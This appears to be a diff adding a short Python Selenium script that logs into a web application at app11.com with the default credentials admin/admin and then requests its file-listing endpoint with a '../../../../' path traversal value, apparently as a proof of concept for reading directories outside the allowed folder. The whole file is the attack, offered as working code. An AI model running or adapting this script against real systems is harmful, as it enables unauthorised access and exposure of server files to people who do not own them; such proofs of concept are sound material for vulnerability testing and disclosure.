@@ -1,0 +1,16 @@
+from selenium import webdriver
+
+profile = webdriver.FirefoxProfile()
+profile.accept_untrusted_certs = True
+driver = webdriver.Firefox(firefox_profile=profile)
+driver.maximize_window()
+
+driver.get('https://app11.com/ajax_login.php')
+elem = driver.find_element_by_name("username")
+elem.send_keys('admin')
+elem = driver.find_element_by_name("password")
+elem.send_keys('admin')
+button = driver.find_element_by_xpath('//input[@type="submit"]')
+button.click()
+driver.get('https://app11.com/ajax_get_file_listing.php?limit=10&view=thumbnail&search=1&search_name=&search_recursively=0&search_mtime_from=&search_mtime_to=&search_folder=../../../../')
+
